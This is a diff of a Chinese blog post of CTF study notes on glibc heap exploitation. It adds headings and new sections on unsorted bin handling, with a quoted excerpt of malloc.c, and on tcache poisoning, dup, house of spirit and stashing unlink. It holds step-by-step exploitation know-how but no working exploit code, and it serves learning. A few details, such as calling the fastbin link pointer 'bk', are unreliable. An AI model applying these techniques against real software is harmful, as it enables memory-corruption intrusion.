@@ -569,8 +569,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>UAF漏洞</strong></p>
-<p>这类漏洞的基础与原理就是在申请堆块后没有在使用free函数释放这个堆块的同时将在申请是用于指向这个堆块的指针一并清0，使得在后面的程序中还能使用这个指针对程序中的数据造成泄露或执行的操作。</p>
+        <h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a><strong>UAF漏洞</strong></h1><p>这类漏洞的基础与原理就是在申请堆块后没有在使用free函数释放这个堆块的同时将在申请是用于指向这个堆块的指针一并清0，使得在后面的程序中还能使用这个指针对程序中的数据造成泄露或执行的操作。</p>
 <p>(想自己写一个例子，发现能力不足，还是从网上抄一下算了)</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/772091-20151028173133357-937820954.png" alt="img"></p>
 <p>如上代码所示，指针p1申请内存，打印其地址，值</p>
@@ -640,8 +639,7 @@
 <p>这种结构出现在大小小于0x400的chunk在被free后链接而成（大于0x400的在free后会成为unsortedbin），在这种结构中，chunk的fd指针由于指向下一个chunk的原本的的数据段，现在的fd段（如果下面没有chunk了，这个fd指针将会指向0）。这里面的chunk在再次使用时遵循的是先进先出的规律，当再次malloc时，先吧上面一个满足大小的chunk拿出来使用，然后在将下面一个满足大小的chunk拿出来使用。</p>
 <p>这里如果我们便可以通过uaf漏洞，将chunk中fd指针的值修改为我们需要的地址空间然后，malloc到这块空间，便可以对其进行修改。</p>
 <p>（这里好像不用在意要修改的地址空间上两位的值能不能构成chunk的prev size和size都可以，malloc到那里直接修改，但是在其他版本可能要满足条件）</p>
-<p><strong>unlink</strong></p>
-<p>现简单说一下这一类题的大致问题在哪里，与一般的解决办法。</p>
+<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><strong>unlink</strong></h1><p>现简单说一下这一类题的大致问题在哪里，与一般的解决办法。</p>
 <p>要能使用这种解决办法的题，会以下的几种重要的东西是我们能够使用的，才能使用这种办法。</p>
 <ol>
 <li>能连续申请几个连续的堆，</li>
@@ -653,23 +651,19 @@
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602084358411.png" alt="image-20240602084358411"></p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085046748.png" alt="image-20240602085046748"></p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085110947.png" alt="image-20240602085110947"></p>
-<p><strong>Off-By-One</strong></p>
-<p>这个漏洞在很多的地方都算是比较常见的吧，不过在之前的栈的时候属于不太好利用的一种，不过在堆中由于堆的特殊性导致，这个漏洞难够在很多地方发挥出意想不到的作用。</p>
+<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a><strong>Off-By-One</strong></h1><p>这个漏洞在很多的地方都算是比较常见的吧，不过在之前的栈的时候属于不太好利用的一种，不过在堆中由于堆的特殊性导致，这个漏洞难够在很多地方发挥出意想不到的作用。</p>
 <p>这个漏洞的具体就是使用read等函数向某块地址写入数据时，如果使用了循环的方式，而循环的次数的大小与那块地址的大小相同，如我们有的是大小为16的数组，我们通过循环向这里写入数字，而我们的循环的次数是由我们数组的大小决定，这里简单的说就是对循环的次数没有进行严格的检查，像循环的次数由变量x决定，并且循环的此时就等于这个x的值，这里x&#x3D;16，看起来好像没什么问题但是会发现，由于程序中的这些数组的起始都是从0开始，包括循环的+</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240604222351621.png" alt="image-20240604222351621"></p>
-<p><strong>unsortedbin泄露libc地址</strong></p>
-<p>关于这种bin的具体结构等之后学会了在细讲，这里先讨论如何利用这种bin将libc的地址泄露。</p>
+<h1 id="unsortedbin泄露libc地址"><a href="#unsortedbin泄露libc地址" class="headerlink" title="unsortedbin泄露libc地址"></a><strong>unsortedbin泄露libc地址</strong></h1><p>关于这种bin的具体结构等之后学会了在细讲，这里先讨论如何利用这种bin将libc的地址泄露。</p>
 <p>由于在不同的libc版本中unsortedbin的产生不同，这里将针对不同libc版本进行分别讲解。</p>
-<p><em>一，libc-2.27</em></p>
-<p>在2.27的libc版本中又一种tcachebins的存在，这会导致数据区小于0x400，整体小于0x410的chunk在free后被放入tcachebins这里面，供下次使用，因此我们这里首先要先malloc一块大小大于0x400的chunk，同时这个chunk还不能与top chunk相邻，否则在free后会被top chunk直接合并，因此我们必须保证这个大于0x400的chunk与top chunk中间还有一个chunk用于隔离这两个chunk。就像满足这样的条件</p>
+<h3 id="一，libc-2-27"><a href="#一，libc-2-27" class="headerlink" title="一，libc-2.27"></a><em>一，libc-2.27</em></h3><p>在2.27的libc版本中又一种tcachebins的存在，这会导致数据区小于0x400，整体小于0x410的chunk在free后被放入tcachebins这里面，供下次使用，因此我们这里首先要先malloc一块大小大于0x400的chunk，同时这个chunk还不能与top chunk相邻，否则在free后会被top chunk直接合并，因此我们必须保证这个大于0x400的chunk与top chunk中间还有一个chunk用于隔离这两个chunk。就像满足这样的条件</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153035259.png" alt="image-20240606153035259"></p>
 <p>然后我们将大于0x400的这块chunk，free掉，就会得到一块被放置在unsortedbin中，且满足条件的free</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153330482.png" alt="image-20240606153330482"></p>
 <p>而此时这个free掉的chunk中的fd和bk指针由于只有这一个chunk在unsortedbin中，所以他们同时指向的都是main_arena+96的地址</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153458981.png" alt="image-20240606153458981"></p>
 <p>并且这个地址在程序中与libc的基地址的距离是始终保持相同的，只要能泄露这个便可以知道程序中的libc的基地址，在其他版本中其实也如此，不过在有的地方也有不同。</p>
-<p><strong>house of orange</strong></p>
-<p>今天做题的时候刚好遇到这个知识点，那就现在把他写一下。</p>
+<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a><strong>house of orange</strong></h1><p>今天做题的时候刚好遇到这个知识点，那就现在把他写一下。</p>
 <p>这个的作用并不能直接作用于程序上实现shell，这个漏洞的作用只是在于特殊情况下泄露libc的地址，其实这里用到也就是创造unsortedbin，从而泄露libc的地址，我们知道在上面的使用unsortedbin泄露libc地址的方法前提是要能创造一个大小满足free后进入unsortedbin的大小的chunk并且这个chunk还不能与top chunk相邻的的条件的chunk，并且还要能将这个chunk，free掉使得它进入到unsortedbin中，然后在将fd指针的值打印出来，这样才能泄露libc的值，而这里我们就是在面对没有free函数的情况下，依然能产生unsortedbin从而泄露libc的值。</p>
 <p>具体的不细将，直接将做法。</p>
 <p>关于这种做法目前我之在libc-2.23上做过，关于其他的libc可能有所不同，请注意。这里也是按在libc-2.23上来讲。</p>
@@ -708,10 +702,8 @@
 <li>打印并接收新chunk的内容（注意如果一定要输入数据，注意不要过多，影响第二字节的内容）</li>
 <li>减去相应的差值得到libc基地址。</li>
 </ul>
-<p><strong>Fastbin Attack</strong></p>
-<p>这一类有四种小类，这里将分批讲解。</p>
-<p><em>Fastbin Double Free</em></p>
-<p>这是一种利用比较多的漏洞，这种漏洞的实现的条件比较苛刻，但其攻击的效果也属于比较明显的便于利用的一种，这种的攻击的手段需要的有uaf漏洞，只有在有uaf漏洞的基础上以及比较早的比如libc2.23这些比较早期的版本下才能实现这种攻击的手段，具体的现在来讲。</p>
+<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a><strong>Fastbin Attack</strong></h1><p>这一类有四种小类，这里将分批讲解。</p>
+<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a><em>Fastbin Double Free</em></h3><p>这是一种利用比较多的漏洞，这种漏洞的实现的条件比较苛刻，但其攻击的效果也属于比较明显的便于利用的一种，这种的攻击的手段需要的有uaf漏洞，只有在有uaf漏洞的基础上以及比较早的比如libc2.23这些比较早期的版本下才能实现这种攻击的手段，具体的现在来讲。</p>
 <p>既然是Double Free，那就必须要进行双重释放，对同一个堆块进行两次free，中间必须要free得有一个或多个chunk这样才能实现对同一个chunk进行两次释放，<img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240418143002441.png" alt="image-20240418143002441"></p>
 <p>这里借用一下之前文章中的图片讲解一下，在fastbin中的结构是用chunk中的fd指针指向之前一个free的指针的头地址，然后bin的指针指向最近free的chunk的头地址，对于最后一个chunk中的fd指针则为0，就这样可以再fastbin中构成由最开始的bin中的指针开始依次由fd指针相连的chunk链，就这样在malloc相同的大小的chunk时便可以在直接从这个fastbin中依次取出来用就行。</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240611213009652.png" alt="image-20240611213009652"></p>
@@ -726,8 +718,7 @@
 <p>这里如果我们在程序的其他地方构造一个fake_chunk（这个地方可以是bss段上，甚至可以是栈上的地址）,并使得第一个chunk中fd指针就指向这个fake_chunk的头地址，而这个fake_chunk的构造很简单，就是确保size段的大小和前两个chunk的size一样，同时其他的保持为0就行，然后在修改了chunk中的fd段后bin中的结构就会改变为如下的结构。</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240611220613433.png" alt="image-20240611220613433"></p>
 <p>这样之后，我们再向程序连续申请两个大小相同的chunk后bin就会指向我们fake_chunkde1,然后在申请一个就会使我们刚刚伪造的fake_chunk,被我们申请为一个新的chunk，从而可以修改这个地址的内容。</p>
-<p><strong>House Of Spirit</strong></p>
-<p>这个方法我个人感觉很奇妙，虽然这种方法有种脱裤子放屁的感觉（在更多的地方感觉使用fd修改可能更多，不过这种方法的思想还很值得学习的）。</p>
+<h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a><em>House Of Spirit</em></h3><p>这个方法我个人感觉很奇妙，虽然这种方法有种脱裤子放屁的感觉（在更多的地方感觉使用fd修改可能更多，不过这种方法的思想还很值得学习的）。</p>
 <p>这种方法的主要过程就是在使用free函数释放某一个chunk，我们通过在bss段或其他的地址伪造一段chunk，在使用于释放的那个指针指向的就是我们伪造的这个chunk，通过这样使得我们这伪造的这个chunk被挂入进fastbin中的单项链表中，被程序识别为一个free掉的chunk，在后期我们在向程序申请相同大小的chunk时，能直接将那块地址作为chunk以供我们要使用，从而是我们能修改那块区域和使用其中的数据段。</p>
 <p>我之前说的脱裤子放屁的感觉就是在这里，我们本可以直接修改fastbin中的bk段直接指向伪造的chunk，但我们却要将那块伪造的chunk释放来挂入fastbin中，这不是脱裤子放屁，这是什么。不过并不是所有题都能直接修改free chunk的，所以这种方法的出现以可以理解。</p>
 <p>关于这种方法在伪造chunk时有几个需要注意的点，这里我直接吵ctfwiki上了，原文在这里</p>
@@ -749,11 +740,11 @@
 <p>这里在讲讲我的自己的简单补充，伪造的chunk最好如下，fake_prev_size的值为0，fake_size可以根据自己的需求来调整，但不能超过fastbin的要求，还有这里填的是0x几0不用加1。在整个fake_chunk结束的下一行便要是宁一个fake chunk，这个只要整prev_szie 和size段就好，这个的prev szie是之前伪造的那个chunk的整体大小，然后size这个的大小在32位系统我使用了0x100是可行的，不知道在64位的系统中可以不，到时候在仔细研究一下。</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"></p>
 <p>就这样我们伪造一个chunk然后把这个chunk的数据段起始地址，当做这个chunk的指针放入free函数中，这样这个chunk变回被程序当做free chunk挂入fastbin中，然后我们在申请这个大小的chunk，便可以把这个地址当做新被chunk，被我们使用。</p>
-<p><strong>Alloc to Stack</strong></p>
-<p><strong>Arbitrary Alloc</strong></p>
+<p><em>Alloc to Stack</em></p>
+<p><em>Arbitrary Alloc</em></p>
 <p>这还有两种方法，这两种方法的大致差别不大，都是在程序中寻找一块可用的地址然后修改fastbin的bk指针使其指向这个地址，在fastbin中增加这块地址，在之后将这块地址申请出来作为一个新chunk使用。</p>
 <p>关于这块这地址的检查，不需要多的就一个对size段的大小检查，因此我们这可以在malloc_hook的地址上面通过偏移地址使得size只有0x7几，这样只要我们申请的chunk大小为0x70，程序就会直接把那块区域分配给我们使用。</p>
-<h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">2017 0ctf babyheap</a></h2><p>这里讲一个泄露libc手法，是在做这道题时遇到的，这个手还是比较可以的。</p>
+<h4 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">2017 0ctf babyheap</a></h4><p>这里讲一个泄露libc手法，是在做这道题时遇到的，这个手法还是比较可以的。</p>
 <p>关于这种手法的使用条件，为</p>
 <ul>
 <li>可以申请多个chunk大小不一</li>
@@ -777,8 +768,7 @@
 <p>在次感谢holk大佬的博客，跪谢！</p>
 <p>其实这种方法的主要目的就在与使用堆溢出修改fastbin中fd的指向，在申请相同chunk区域，使得程序中两个地址同时记录着同一块chunk的指针，然后利用这块chunk产生unsortbin，在利用后面存放这块chunk的指针打印chunk中的内容，从而实现libc地址的泄露。</p>
 <p>巧妙的方法，感觉要长脑子了。</p>
-<p><strong>Unsorted Bin Attack</strong></p>
-<p>这个手法咋说呢，感觉有点鸡肋，单独使用的作用并不是那么的大，可能在大部分时候要配和着其他的手法来使用才算可以发挥作用，或许可以用来在有的时候用于泄露libc的地址，但条件感觉要的有点多，在没有在实际的题目的使用过。并且这种攻击的手法之前好像看见有人说从libc2.28开始就不能再使用，在系统中多了对Unsorted Bin 的大小检测的函数，这种攻击的方式便不能再使用所以对题目的要求也较高，就有点鸡肋。不过既然有种手法就还是学一下，至少知道这种漏洞的存在。</p>
+<h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a><strong>Unsorted Bin Attack</strong></h1><p>这个手法咋说呢，感觉有点鸡肋，单独使用的作用并不是那么的大，可能在大部分时候要配和着其他的手法来使用才算可以发挥作用，或许可以用来在有的时候用于泄露libc的地址，但条件感觉要的有点多，在没有在实际的题目的使用过。并且这种攻击的手法之前好像看见有人说从libc2.28开始就不能再使用，在系统中多了对Unsorted Bin 的大小检测的函数，这种攻击的方式便不能再使用所以对题目的要求也较高，就有点鸡肋。不过既然有种手法就还是学一下，至少知道这种漏洞的存在。</p>
 <p>前话到此为止，现在开始讲有关这种手法的操作。</p>
 <p>关于Unsorted Bin这是一个神奇的bin，我们知道有的chunk由于大小限制所以在释放后会被放入的Unsorted Bin中作为其中的一部分free chunk以供下次申请时快速使用，但是其实在没有chunk进入到unsorted bin的时候他自己本身就是一个单独的chunk结构，不过不参与到chunk的分配只作用来作为unsorted bin的基础机构，如下图</p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240615220108814.png" alt="image-20240615220108814"></p>
@@ -799,6 +789,94 @@
 <li>修改这个unsorted bin的bk指针指向我们要修改的地址-0x10的地址</li>
 <li>重新通过malloc启用unsorted bin中的那个chunk</li>
 </ol>
+<h3 id="关于unsorted-bin"><a href="#关于unsorted-bin" class="headerlink" title="关于unsorted bin"></a><em>关于unsorted bin</em></h3><p>这里讲一下有关于unsorted bin中的chunk的分配有关的事情，我们知道除了再有tcache bin的情况下一般只要大于fastbin的范围（0x80）的free chunk会被放入到unsorted bin中，但unsorted bin并不会长期存放，只会作为一个暂时的chunk存放地，在之后如果有需要malloc时，程序会先看fastbin中是否有符合要求的free chunk ，然后在在unsorted bin中寻找。</p>
+<p>这里我们假设在unsorted bin中有两个chunk，一个为chunk(P1)0x390（&lt;0x3F0）,另一个为chunk(P2)0x410（&gt;0x3F0）这两个chunk，并且小的chunk在第一位大的在第二位。这时我们向程序申请1个0x90的chunk，程序会在unsorted bin中进行寻找，而寻找的过程并不简单。</p>
+<ul>
+<li>从unsorted bin中拿出最后一个chunk(P1)</li>
+<li>把这个chunk(P1)放进small bin中，并标记这个small bin中有空闲的chunk（小于0x3F0）</li>
+<li>从unsorted bin中拿出最后一个chunk(P2)（P1被拿走之后P2就作为最后一个chunk了）</li>
+<li>把这个chunk(P2)放进large bin中，并标记这个large bin有空先的chunk(大于0x3F0)</li>
+<li>现在unsorted bin中为空，从small bin中的P1中分割出一个小chunk，满足请求的P4，并把剩下的chunk(0x390 - 0xa0后记<code>P1_left</code>)放回unsorted bin中</li>
+</ul>
+<p>这个过程是比较复杂的，我这里讲的依然只是其中的一种情况，还有很多情况没有说。</p>
+<h2 id="malloc-c中从unsorted-bin中摘除chunk完整过程代码"><a href="#malloc-c中从unsorted-bin中摘除chunk完整过程代码" class="headerlink" title="malloc.c中从unsorted bin中摘除chunk完整过程代码"></a>malloc.c中从unsorted bin中摘除chunk完整过程代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面这是完整的原代码有时间再详细分析一下。</p>
+<h1 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a><strong>tcache attack</strong></h1><p>fast bin&#x3D;0~0x80</p>
+<p>small bin&lt;0x3F0</p>
+<p>large bin&gt;0x3F0</p>
+<p>tcache bin 最多有7个chunk，多的要放在其他bin中。</p>
+<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a><em>tcache poisoning</em></h3><p>这个漏洞的的利用是很方便的，同时效果也很强，不过这个漏洞的很大问题在于这个目前只能在libc2.27的版本上利用，在高一点的版本都对其有检测，不能利用，这是很重要的一点。</p>
+<p>这个漏洞利用的是在tcache中的链表对chunk的检测不完全而到导致的，先来讲一下tcache bin中的chunk结构。</p>
+<p>当程序中有被free的程序进入到tcache bin中，当进入的数量大于两个后程序会将这里chunk通过他们的fd指针链接起来，而链接的过程是，由后一个进入tcache bin的chunk在fd中产生一个指向上一个chunk的数据段的指针，依次相连从而构成tcache bin，并且bin的记录的是新进入的chunk，在后面的程序有需要chunk时，程序变会从记录的第一个开始，依次分配chunk以供使用，所以其分配结构为<strong>先进后出，后进先出</strong>的结构。</p>
+<p>那么既然知道了tcache bin中的chunk链表结构，便会发现一个很严重的问题，这里tcache bin上的chunk是有fd指针指向下一个chunk的数据段，来相连的。并且在libc.2.27这个版本中有一个很大的问题，在于使用fd指向的下一个chunk，在上一个chunk没分配出去后，将这个fd指向的记录在bin中时，程序不会有任何检测，同样的在malloc那块地址时，也不会对那块地址有任何检测，因此这里我们的这个漏洞便出现了。</p>
+<p>到我们使用堆溢出或uaf将tcache bin中的chunk的fd指针，修改为一个我们需要修改的地址后（这里由于程序对那个地址没有一点检测，同时fd指针指向的是chunk的数据段，因此我们直接修改为要修改的地址就行），程序便会直接将那块地址记录在tcache bin中，我们一直申请向程序申请与之前的free chunk相同的chunk，那程序便会现将前面的chunk分出去,然后变会来到被我修改了的fd指针，并因为程序对chunk的不检查，从而导致我们输入到fd的地址被直接分配成我们需要的chunk以供我们使用，这样我们便可以修改那块地址。</p>
+<p>总结一下</p>
+<ol>
+<li>产生tcache bin中的chunk链表</li>
+<li>将tcache bin中的chunk的fd指针修改为我们要修改的地址</li>
+<li>申请大小与修改的chunk相同的chunk，一直申请到修改的fd指针被分配出去</li>
+<li>我们要的地址被认作chunk分配给我们使用，从而修改那块地址</li>
+</ol>
+<p>这个方法是很简单的一种，但限制也很大几乎只能在libc.2.27的条件下使用。</p>
+<h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a><em>tcache dup</em></h3><p>这个漏洞也是一个几乎只能在libc.2.27使用的漏洞。</p>
+<p>这里利用的是在tcache bin对free进的函数没有然后检测从而利用的漏洞</p>
+<p>这个漏洞也算是一个比较离谱的漏洞，这个简单说就是对同一个chunk连续两次free，在连续两次申请相同大小的chunk，从而导致程序中的后面两个malloc的指针同时指向一个chunk。这里的由于程序对这个释放的过程并不会有检测从而导致，我们能同时连续对一块chunk释放两次。中间甚至不用free其他的chunk从而间隔。</p>
+<p>所以这个漏洞就是对同一个chunk，free两次，然后在申请相同大小的chunk两次，这两次的指针会指向同一个chunk。</p>
+<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a><em>tcache house of spirit</em></h3><p>这个漏洞和上一个一样也是只能在libc.2.27的上使用的漏洞。</p>
+<p>这个漏洞的利用很简单，只要我们在程序的某一个地方伪造一个fake_chunk然后将这个chunk直接free进tcache  bin中，在后面的malloc中申请我们fake_chunk的大小chunk，这样就可以把这个fake_chunk当做一个真正的chunk分配给我们使用。</p>
+<p>关于这个fake_chunk的伪造条件只有一个，就是要保证这个fake_chunk的size为一个相对正确的chunk大小，这样就可以满足要求了。</p>
+<ul>
+<li>找到要伪造的chunk的地址，就这个地址的size为一个正确的地址。</li>
+<li>将这个fake_chunk的数据段地址使用free函数将这个fake_chunk挂入tcache bin中</li>
+<li>申请我们刚刚free的fake_chunk的大小的chunk</li>
+</ul>
+<p>这样我们fake_chunk就会被当做chunk供我们使用。</p>
+<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a><em>tcache stashing unlink attack</em></h3><p>这个漏洞的利用相较上面的几种就相对来说要复杂一点，并且利用的东西也多了很多，</p>
+<ul>
+<li>当使用calloc分配的堆块时会从small bin中获取（不从tcache bin中拿）</li>
+<li>获取一次之后会将small bin中其余堆块挂进tcache中（前提tcache中有相同堆块的链表，且其中chunk大小相同有剩余）</li>
+<li>在将small bin中其余堆块挂进tcache中这个过程中只会对第一个挂进去的chunk进行完整性检查，后面的不做检查</li>
+</ul>
+<p>这里其实就已经很明显的告诉我们这里我们可以在程序中，产生small bin后在small bin中修改chunk的控制字段，从而使伪造的fake_chunk挂入small bin中，在使用calloc分配一个相同大小的chunk，从而使small bin的剩下的chunk挂入tcache bin中，这里注意一定要保证我们伪造的fake_chunk之前还有一个正常的chunk，只有这样才能保证我们的fake_chunk能顺利挂入tcache bin，然后被分配出来。</p>
